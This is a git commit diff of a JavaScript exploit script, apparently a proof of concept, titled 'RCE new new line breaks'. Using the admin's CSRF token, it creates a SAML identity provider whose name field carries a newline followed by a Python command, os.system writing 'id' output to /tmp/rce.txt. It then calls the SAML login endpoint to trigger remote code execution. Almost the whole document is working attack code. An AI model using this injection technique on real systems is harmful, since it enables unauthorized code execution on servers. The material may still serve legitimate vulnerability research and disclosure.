309ce7248fae7a6bbadb680e8f75afa92a3d7d8c
Anurag Verma <104461155+anurag-verma-india@users.noreply.github.com>
2026-05-25 20:17:47 +0530

    RCE new new line breaks

--- m.js
+++ m.js
@@ -1,7 +1,14 @@
-(function() {
+ (function() {
      const id = Math.floor(Math.random() * 9999);
-     const slug = 'debug-' + id;
-     const name = 'Debug' + id; // No newline yet
+     const slug = 'exp-' + id;
+
+     // Using backticks for the payload to allow the literal newline
+     const name = `Exploit${id}
+ import os;os.system("id > /tmp/rce.txt")`;
+
+     const xml = '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
+      protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
+      Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>';
 
      $.post('/admin/uac/identityprovider/add/', {
          csrfmiddlewaretoken: Cookies.get('csrftoken'),
@@ -9,20 +16,14 @@
          slug: slug,
          protocol: 'saml',
          status: 'active',
+         saml_metadata_xml: xml,
          use_custom_attribute_map: 'on',
          attribute_mapping: '{"email":["mail"]}',
-         saml_metadata_xml: '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
- protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
- Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>',
          _save: 'Save'
-     }).done(function(data, textStatus, jqXHR) {
-         if (jqXHR.status === 200 && data.includes('errorlist')) {
-             alert("Validation Error! Check console for details.");
-             console.log(data);
-         } else {
-             alert("IDP Created! Triggering RCE...");
-             $.get('/saml2/login/' + slug + '/');
-         }
+     }).done(() => {
+         console.log("IDP Created: " + slug);
+         // Trigger the RCE
+         $.get('/saml2/login/' + slug + '/');
      });
  })();
 
